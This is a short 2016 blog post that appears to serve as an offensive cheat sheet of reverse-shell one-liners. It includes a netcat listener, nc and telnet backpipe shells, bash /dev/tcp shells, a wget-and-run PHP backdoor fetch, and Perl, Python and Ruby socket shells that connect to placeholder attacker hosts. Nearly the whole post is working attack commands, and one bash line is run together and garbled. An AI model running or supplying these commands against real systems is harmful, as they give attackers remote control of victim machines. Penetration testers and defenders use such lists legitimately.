---
layout: post
title: "Reverse Shells"
description: "quick and dirty reverse shells"
tags: ["Security", "Offense", "Reverse-Shell"]
date: 2016-12-27
---

Reverse shells can be used to execute commands or collect data from another computer. The concept is that the attacker opens a listening port on which the victim (through some exploit) connects to the attacker over tcp. This configuration also works vice versa which is known as a bind shell.

It's important to consider what software the victim might have on their machine to enable this connection, thus using built in tools can be a smart approach.

##### Here's how you start the listener to connect to the vicitm (using netcat):

	attacker$ nc -l -v attackerip 4444


##### Netcat

	nc <attacker_ip> <port> -e /bin/bash

##### no -e flag? use the GAPING_SECURITY_HOLE technique

	mknod backpipe p; nc <attacker_ip> <port> 0<backpipe | /bin/bash 1>backpipe

##### /dev/tcp

	/bin/bash -i > /dev/tcp/<attacker_ip>/<port> 0<&1 2>&1

##### Telnet - GAPING_SECURITY_HOLE

	mknod backpipe p; telnet <attacker_ip> <port> 0<backpipe | /bin/bash 1>backpipe

##### PHP

	wget -O /tmp/bd.php <url_to_malicious_file> && php -f /tmp/bd.php

##### Bash

	bash -i >& /dev/tcp/10.0.0.1/8080 0>&10<&196;exec 196<>/dev/tcp/attackerip/4444;

	sh <&196 >&196 2>&196

	exec 5<>/dev/tcp/attackerip/4444

	cat <&5 | while read line; do $line 2>&5 >&5; done  # or:

	while read line 0<&5; do $line 2>&5 >&5; done

##### PERL

	perl -MIO::Socket -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr => "127.0.0.1:1234");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'

##### Python

	python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

##### Ruby

	ruby -rsocket -e 'exit if fork;c=TCPSocket.new("attackerip","4444");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'

##### Further Reading

[http://bernardodamele.blogspot.com/2011/09/reverse-shells-one-liners.html][1]

[https://pen-testing.sans.org/blog/2013/05/06/netcat-without-e-no-problem][2]

[1]:	http://bernardodamele.blogspot.com/2011/09/reverse-shells-one-liners.html
[2]:	https://pen-testing.sans.org/blog/2013/05/06/netcat-without-e-no-problem
